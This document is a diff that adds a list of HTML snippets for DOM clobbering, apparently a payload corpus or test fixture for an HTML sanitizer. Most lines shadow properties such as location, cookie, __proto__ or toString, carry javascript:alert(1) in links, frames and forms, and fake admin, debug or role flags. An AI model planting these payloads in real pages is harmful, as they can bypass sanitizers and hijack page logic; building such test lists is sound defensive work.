@@ -1,2 +1,42 @@
-<a id=x><a id=x name=y href="javascript:alert(1)">
-<form id=x><input id=y name=action value=javascript:alert(1)>
+<img name=x>
+<img name=body>
+<img name=documentElement>
+<a name=x href=javascript:alert(1)>click</a>
+<a name=body href=javascript:alert(1)>click</a>
+<form name=x><input name=y value=z></form>
+<form id=x><input name=y value=z></form>
+<a name=x id=y href="javascript:alert(1)">
+<img name=location src=x>
+<img name=location src="javascript:alert(1)">
+<form name=location action="javascript:alert(1)">
+<a id=anchor href=javascript:alert(1)>
+<a id=x></a><a id=x name=y href=javascript:alert(1)>click</a>
+<form id=x name=y><input name=z></form>
+<img name=toString>
+<img name=valueOf>
+<img name=constructor>
+<img name=prototype>
+<img name=__proto__>
+<img name=hasOwnProperty>
+<a name=x></a><a name=x id=y href=javascript:alert(1)>
+<object name=x id=y data=javascript:alert(1)>
+<iframe name=x id=y src=javascript:alert(1)>
+<form name=config><input name=debug value=true></form>
+<form name=options><input name=allowedOrigins value="*"></form>
+<form name=settings><input name=role value=admin></form>
+<input name=token value=CSRF_TOKEN id=csrf>
+<input name=admin value=true>
+<input name=isAdmin value=true>
+<input name=debug value=true>
+<a name=HTMLEscapeOutput href=javascript:alert(1)>
+<a name=escape href=javascript:alert(1)>
+<a name=sanitize href=javascript:alert(1)>
+<form name=window><input name=location value=javascript:alert(1)></form>
+<a id=window name=location href=javascript:alert(1)>
+<a id=document name=cookie href=javascript:alert(1)>
+<form id=document><input name=domain value=evil.com></form>
+<form id=window><input name=name value=evil></form>
+<img name=opener src=x>
+<img name=parent src=x>
+<img name=top src=x>
+<img name=frames src=x>
